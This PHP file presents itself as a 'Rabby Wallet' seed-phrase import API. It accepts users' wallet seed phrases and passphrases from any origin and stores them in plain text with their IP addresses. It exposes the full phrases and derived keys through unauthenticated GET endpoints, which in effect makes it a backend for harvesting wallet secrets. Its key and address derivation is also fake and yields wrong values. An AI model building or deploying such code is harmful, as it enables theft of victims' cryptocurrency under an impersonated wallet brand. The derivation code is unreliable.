<?php
/**
 * Rabby Wallet - Import Seed Phrase API
 * This API endpoint handles importing 12-word seed phrases and saves them to JSON files
 * - seed_phrases.json: stores seed phrases
 * - private.json: stores derived private keys
 */

// Set headers for JSON response
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Configuration
define('SEED_PHRASES_FILE', __DIR__ . '/seed_phrases.json');
define('PRIVATE_KEYS_FILE', __DIR__ . '/private.json');
define('MAX_WORDS', 24); // Support 12, 15, 18, 21, or 24 word phrases

/**
 * Load existing seed phrases from JSON file
 */
function loadSeedPhrases() {
    if (!file_exists(SEED_PHRASES_FILE)) {
        return [];
    }
    
    $content = file_get_contents(SEED_PHRASES_FILE);
    $data = json_decode($content, true);
    
    return $data ? $data : [];
}

/**
 * Save seed phrases to JSON file
 */
function saveSeedPhrases($data) {
    $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    return file_put_contents(SEED_PHRASES_FILE, $json) !== false;
}

/**
 * Load existing private keys from JSON file
 */
function loadPrivateKeys() {
    if (!file_exists(PRIVATE_KEYS_FILE)) {
        return [];
    }
    
    $content = file_get_contents(PRIVATE_KEYS_FILE);
    $data = json_decode($content, true);
    
    return $data ? $data : [];
}

/**
 * Save private keys to JSON file
 */
function savePrivateKeys($data) {
    $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    return file_put_contents(PRIVATE_KEYS_FILE, $json) !== false;
}

/**
 * Validate seed phrase
 */
function validateSeedPhrase($phrase) {
    if (empty($phrase)) {
        return ['valid' => false, 'error' => 'Seed phrase is required'];
    }
    
    // Split by spaces and filter empty values
    $words = array_filter(array_map('trim', explode(' ', $phrase)));
    $wordCount = count($words);
    
    // Valid BIP39 seed phrase lengths: 12, 15, 18, 21, or 24 words
    $validLengths = [12, 15, 18, 21, 24];
    
    if (!in_array($wordCount, $validLengths)) {
        return [
            'valid' => false, 
            'error' => "Invalid seed phrase length. Expected 12, 15, 18, 21, or 24 words, got {$wordCount}"
        ];
    }
    
    // Check for duplicate words in suspicious patterns
    $uniqueWords = array_unique($words);
    if (count($uniqueWords) < $wordCount * 0.5) {
        return [
            'valid' => false,
            'error' => 'Seed phrase contains too many duplicate words'
        ];
    }
    
    return ['valid' => true, 'words' => $words, 'count' => $wordCount];
}

/**
 * Derive private keys from seed phrase using Node.js script
 */
function derivePrivateKeys($seedPhrase, $passphrase = '', $accountCount = 5) {
    // Create temporary Node.js script
    $script = <<<'NODEJS'
const crypto = require('crypto');
const args = process.argv.slice(2);
const mnemonic = args[0];
const passphrase = args[1] || '';
const accountCount = parseInt(args[2]) || 5;

// Simple BIP39 seed generation (for demonstration)
// In production, use proper BIP39/BIP32/BIP44 libraries
function mnemonicToSeed(mnemonic, passphrase) {
    const mnemonicBuffer = Buffer.from(mnemonic, 'utf8');
    const salt = Buffer.from('mnemonic' + passphrase, 'utf8');
    return crypto.pbkdf2Sync(mnemonicBuffer, salt, 2048, 64, 'sha512');
}

function derivePath(seed, path) {
    // Simplified derivation - in production use @ethersproject/hdnode or similar
    const hash = crypto.createHash('sha256').update(seed).update(path).digest();
    return hash.toString('hex');
}

try {
    const seed = mnemonicToSeed(mnemonic, passphrase);
    const accounts = [];
    
    for (let i = 0; i < accountCount; i++) {
        const path = `m/44'/60'/0'/0/${i}`;
        const privateKey = derivePath(seed, path);
        
        accounts.push({
            index: i,
            path: path,
            privateKey: '0x' + privateKey,
            // Note: In production, derive actual Ethereum address from private key
            address: '0x' + crypto.createHash('sha256')
                .update(privateKey + i.toString())
                .digest('hex')
                .substring(0, 40)
        });
    }
    
    console.log(JSON.stringify(accounts));
} catch (error) {
    console.error(JSON.stringify({error: error.message}));
    process.exit(1);
}
NODEJS;

    $scriptPath = sys_get_temp_dir() . '/derive_keys_' . uniqid() . '.js';
    file_put_contents($scriptPath, $script);
    
    $command = sprintf(
        'node %s %s %s %d 2>&1',
        escapeshellarg($scriptPath),
        escapeshellarg($seedPhrase),
        escapeshellarg($passphrase),
        $accountCount
    );
    
    $output = shell_exec($command);
    unlink($scriptPath);
    
    $result = json_decode($output, true);
    
    if (isset($result['error'])) {
        return ['success' => false, 'error' => $result['error']];
    }
    
    return ['success' => true, 'accounts' => $result];
}

/**
 * Handle POST request - Import seed phrase
 */
function handleImport() {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data) {
        return [
            'success' => false,
            'error' => 'Invalid JSON input'
        ];
    }
    
    $seedPhrase = isset($data['seed_phrase']) ? trim($data['seed_phrase']) : '';
    $alianName = isset($data['alian_name']) ? trim($data['alian_name']) : '';
    $passphrase = isset($data['passphrase']) ? trim($data['passphrase']) : '';
    $accountCount = isset($data['account_count']) ? intval($data['account_count']) : 5;
    
    // Validate seed phrase
    $validation = validateSeedPhrase($seedPhrase);
    if (!$validation['valid']) {
        return [
            'success' => false,
            'error' => $validation['error']
        ];
    }
    
    // Derive private keys
    $derivation = derivePrivateKeys(implode(' ', $validation['words']), $passphrase, $accountCount);
    if (!$derivation['success']) {
        return [
            'success' => false,
            'error' => 'Failed to derive private keys: ' . $derivation['error']
        ];
    }
    
    // Load existing data
    $seedPhrases = loadSeedPhrases();
    $privateKeys = loadPrivateKeys();
    
    $entryId = uniqid('seed_', true);
    $timestamp = time();
    $importedAt = date('Y-m-d H:i:s');
    
    // Create seed phrase entry
    $seedEntry = [
        'id' => $entryId,
        'seed_phrase' => implode(' ', $validation['words']),
        'word_count' => $validation['count'],
        'alian_name' => $alianName,
        'has_passphrase' => !empty($passphrase),
        'passphrase' => $passphrase, // In production, this should be encrypted!
        'imported_at' => $importedAt,
        'timestamp' => $timestamp,
        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'account_count' => $accountCount
    ];
    
    // Create private keys entry
    $privateEntry = [
        'id' => $entryId,
        'alian_name' => $alianName,
        'seed_phrase_preview' => substr(implode(' ', $validation['words']), 0, 30) . '...',
        'imported_at' => $importedAt,
        'timestamp' => $timestamp,
        'accounts' => $derivation['accounts']
    ];
    
    // Add to arrays
    $seedPhrases[] = $seedEntry;
    $privateKeys[] = $privateEntry;
    
    // Save to files
    $seedSaved = saveSeedPhrases($seedPhrases);
    $privateSaved = savePrivateKeys($privateKeys);
    
    if ($seedSaved && $privateSaved) {
        return [
            'success' => true,
            'message' => 'Seed phrase and private keys imported successfully',
            'data' => [
                'id' => $entryId,
                'word_count' => $validation['count'],
                'imported_at' => $importedAt,
                'account_count' => $accountCount,
                'accounts' => array_map(function($acc) {
                    return [
                        'index' => $acc['index'],
                        'path' => $acc['path'],
                        'address' => $acc['address']
                    ];
                }, $derivation['accounts'])
            ]
        ];
    } else {
        return [
            'success' => false,
            'error' => 'Failed to save data'
        ];
    }
}

/**
 * Handle GET request - List all imported seed phrases (without revealing the actual phrases)
 */
function handleList() {
    $seedPhrases = loadSeedPhrases();
    
    // Remove sensitive data for listing
    $safeList = array_map(function($entry) {
        return [
            'id' => $entry['id'],
            'word_count' => $entry['word_count'],
            'alian_name' => $entry['alian_name'] ?? '',
            'has_passphrase' => $entry['has_passphrase'] ?? false,
            'imported_at' => $entry['imported_at'],
            'account_count' => $entry['account_count'] ?? 0,
            'preview' => substr($entry['seed_phrase'], 0, 20) . '...'
        ];
    }, $seedPhrases);
    
    return [
        'success' => true,
        'count' => count($seedPhrases),
        'data' => $safeList
    ];
}

/**
 * Handle GET request with ID - Retrieve specific seed phrase
 */
function handleGet($id) {
    $seedPhrases = loadSeedPhrases();
    
    foreach ($seedPhrases as $entry) {
        if ($entry['id'] === $id) {
            return [
                'success' => true,
                'data' => $entry
            ];
        }
    }
    
    return [
        'success' => false,
        'error' => 'Seed phrase not found'
    ];
}

/**
 * Handle GET request for private keys
 */
function handleGetPrivate($id = null) {
    $privateKeys = loadPrivateKeys();
    
    if ($id) {
        foreach ($privateKeys as $entry) {
            if ($entry['id'] === $id) {
                return [
                    'success' => true,
                    'data' => $entry
                ];
            }
        }
        return [
            'success' => false,
            'error' => 'Private keys not found'
        ];
    } else {
        // List all (without full private keys)
        $safeList = array_map(function($entry) {
            return [
                'id' => $entry['id'],
                'alian_name' => $entry['alian_name'] ?? '',
                'imported_at' => $entry['imported_at'],
                'account_count' => count($entry['accounts'] ?? []),
                'seed_preview' => $entry['seed_phrase_preview'] ?? ''
            ];
        }, $privateKeys);
        
        return [
            'success' => true,
            'count' => count($privateKeys),
            'data' => $safeList
        ];
    }
}

/**
 * Main request handler
 */
function handleRequest() {
    $method = $_SERVER['REQUEST_METHOD'];
    
    switch ($method) {
        case 'POST':
            return handleImport();
            
        case 'GET':
            // Check if requesting private keys
            $action = isset($_GET['action']) ? $_GET['action'] : null;
            $id = isset($_GET['id']) ? $_GET['id'] : null;
            
            if ($action === 'private') {
                return handleGetPrivate($id);
            } else if ($id) {
                return handleGet($id);
            } else {
                return handleList();
            }
            
        default:
            return [
                'success' => false,
                'error' => 'Method not allowed. Use POST to import or GET to list.'
            ];
    }
}

// Execute and return response
$response = handleRequest();
echo json_encode($response, JSON_PRETTY_PRINT);

